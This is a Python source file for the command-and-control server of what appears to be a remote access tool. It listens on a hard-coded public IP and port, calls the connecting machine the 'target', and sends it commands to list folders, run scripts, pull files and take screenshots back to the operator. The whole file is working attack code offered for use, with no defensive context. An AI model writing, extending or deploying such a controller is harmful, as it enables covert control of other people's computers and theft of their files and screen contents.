import socket
import json
import tqdm
import os
import time
def send1(datasend):
    jsdata = json.dumps(datasend)
    target.send(jsdata.encode())
def recv():
    data1 =''
    while True:
        try:
            data1 = data1 + target.recv(1024).decode().rstrip()
            return json.loads(data1)
        except ValueError:
            continue
def recvf():
    SEPARATOR = "<SEPARATOR>"
    received = target.recv(4096).decode()
    filename, filesize = received.split(SEPARATOR)
    filename = os.path.basename(filename)
    filesize = int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "wb") as f:
        size1=0
        while size1 < filesize:
            bytes_read = target.recv(4096)
            if not bytes_read:
                # No data received; you can add a timeout here if needed
                break
            f.write(bytes_read)
            progress.update(len(bytes_read))
            size1 += len(bytes_read)
            print(size1, filesize)

def sendf(imgpth1):

    imgpth = ''.join(imgpth1)
    SEPARATOR = "<SEPARATOR>"
    filesize = os.path.getsize(imgpth)
    target.send(f"{imgpth}{SEPARATOR}{filesize}".encode())
    progress = tqdm.tqdm(range(filesize), f"Sending {imgpth}", unit="B", unit_scale=True, unit_divisor=1024)
    time.sleep(0.2)
    with open(imgpth, "rb") as f:
        while True:
            # read the bytes from the file
            bytes_read = f.read(4096)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            target.sendall(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
        print("transmission done")

def targcom():
    while True:
        command = input(str(ip)+":")
        if command == "help":
            table = """
                    | Command                | Description                                                     |
                    |------------------------|-----------------------------------------------------------------|
                    | `ls`                   | List the files and directories in the current directory.        |
                    | `cd <foldername>`      | Change the current directory to the specified folder.           |
                    | `cd ..`                | Navigate to the parent directory.                               |
                    | `pwd`                  | Print the current working directory.                            |
                    | `cat`                  | Display the contents of a text file.                            |
                    | `python1 <filename>`   | Execute a Python 1.x script with the specified filename.        |
                    | `python3 <filename>`   | Execute a Python 3.x script with the specified filename.        |
                    | `copy <filename>`      | Copy a file from the client to the server.                      |
                    | `bye`                  | Disconnect from the server.                                     |
                    | `scrst`                | Command description not provided.                               |
                    | `send <filename>`      | Send a file to the server.                                      |
                    | `help`                 | Display a list of available commands.                           |
                    """
            print(table)
        else:
            command.strip()
            if len(command)>1:
                send1(command)
                command1 = command.split()
                match command1[0]:
                    case "scrst":
                        recvf()
                        print("transfer complete")
                    case "copy":
                        recvf()
                        print("copy complete")
                    case "send":
                        sendf(command1[1:])
                    case "lsl":
                        cd1=os.getcwd()
                        a= os.listdir(cd1)
                        sender = ""
                        if a:
                            for i in a:
                                if os.path.isdir(i):
                                    sender = sender + i +" -d" +"\n"
                                else :
                                    sender = sender + i + " -f"+"\n"
                            print(sender)
                        else:
                            print("empty")
                    case "pwdl":
                        print(os.getcwd())
                    case "cdl":
                            try:
                                data=' '.join(command1[1:])
                                if "\\" in data:
                                    os.chdir(data)
                                    print("changed to "+os.getcwd())
                                elif data == "..":
                                    data1=os.getcwd()
                                    for i in range(len(data1)):
                                        if data1[i] == "\\":
                                            last=i
                                    os.chdir(data1[:last])
                                    print("changed to "+os.getcwd())
                        
                                else:
                                    os.chdir(os.getcwd()+"\\"+data)
                                    print("changed to "+os.getcwd())
                            except FileNotFoundError:
                                send1("file not found")
                    
                    case _:
                        result = recv()
                        print(result)
                        if "Bye ...." in result:
                            sock.close()
                            exit(0)
            else:
                print("Invalid command")
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('68.183.89.11',5555))
print("Listening for connections")
sock.listen(5)
target , ip=sock.accept()
print("Connection established"+str(ip))
targcom()